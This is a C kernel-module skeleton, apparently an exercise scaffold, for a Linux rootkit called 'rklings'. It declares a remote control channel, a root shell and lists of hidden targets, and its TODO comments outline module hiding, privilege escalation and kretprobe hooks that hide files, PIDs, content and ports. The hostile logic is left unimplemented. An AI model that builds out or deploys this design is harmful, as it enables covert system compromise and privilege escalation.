// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/err.h>
#include <linux/errno.h>
#include <linux/hex.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/pid.h>
#include <linux/proc_fs.h>
#include <linux/ptrace.h>
#include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/seq_file.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <net/inet_sock.h>
#include <net/sock.h>

#include "agent.h"
#include "root_shell.h"
#include "target_list.h"

#define RK_BUF_MAX 2048
#define RK_CMD_MAX 128
#define RK_PREFIX "rklings."
#define RK_PREFIX_LEN 8
#define RK_PATH_MAX 128

static unsigned short peer_port;
module_param(peer_port, ushort, 0400);
MODULE_PARM_DESC(peer_port, "control TCP listener port");

static char peer_address_text[16] = "127.0.0.1";
module_param_string(peer_address, peer_address_text,
		    sizeof(peer_address_text), 0400);
MODULE_PARM_DESC(peer_address, "control IPv4 peer address");

static unsigned int retry_base_ms = 25;
module_param(retry_base_ms, uint, 0400);
MODULE_PARM_DESC(retry_base_ms, "initial reconnect delay in milliseconds");

static unsigned int retry_max_ms = 200;
module_param(retry_max_ms, uint, 0400);
MODULE_PARM_DESC(retry_max_ms, "maximum reconnect delay in milliseconds");

static unsigned int shell_timeout_ms = 60000;
module_param(shell_timeout_ms, uint, 0400);
MODULE_PARM_DESC(shell_timeout_ms, "root shell inactivity timeout in milliseconds");

static char control_key[65];
module_param_string(control_key, control_key, sizeof(control_key), 0400);
MODULE_PARM_DESC(control_key, "hex-encoded 256-bit control key");

static struct rk_agent agent;
static struct rk_root_shell shell;
struct rk_target_list file_targets;
struct rk_target_list pid_targets;
struct rk_target_list content_targets;
struct rk_target_list port_targets;
static struct proc_dir_entry *proc_entry;
static struct list_head *saved_prev;
bool module_hidden;
static bool persist_requested;

// TODO: rk_module_hide, rk_module_unhide

// TODO: rk_escalate_self (escalate current + parent)

// TODO: rk_escalate_pid(unsigned int pid)

// TODO: rk_parse_local_command(path) dispatch table:
//   "e"           -> rk_escalate_self()
//   "h.m" / "u.m" -> module hide/unhide
//   "persist"     -> set persist_requested
//   "h.f.VALUE"   -> rk_target_add(&file_targets, VALUE)
//   "h.i.VALUE"   -> rk_target_add(&pid_targets, VALUE)
//   "h.c.VALUE"   -> rk_target_add(&content_targets, VALUE)
//   "h.p.VALUE"   -> rk_target_add(&port_targets, VALUE)
//   "u.{f,i,c,p}.ARG" -> rk_target_remove_either

// TODO: mkdir kretprobe (local command interception)

// TODO: getdents64 kretprobe (directory/PID hiding)

// TODO: vfs_read kretprobe (content hiding)

// TODO: tcp4_seq_show kretprobe (port hiding)

// TODO: /proc/rkling_status (read-only status)

// TODO: hex key parser

// TODO: rk_init, rk_exit

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings complete rootkit");
